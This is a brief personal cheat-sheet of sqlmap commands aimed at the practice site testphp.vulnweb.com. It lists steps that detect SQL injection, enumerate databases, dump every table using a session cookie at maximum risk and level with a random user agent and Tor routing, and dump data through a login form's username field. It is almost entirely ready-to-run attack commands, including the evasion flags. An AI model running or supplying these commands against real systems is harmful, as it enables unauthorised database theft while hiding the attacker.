

dump
- sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
- sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
- sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --cookie="security=low; PHPSESSID=13o5hlkjs3hur2pvnfkgim9t74" --dump-all --batch --output-dir="db-dump" --random-agent --risk=3 --level=5 --tor

- sqlmap -u .../login --data "username=a&password=b" -p username --dump --output-dir="db-dump"

Upload File
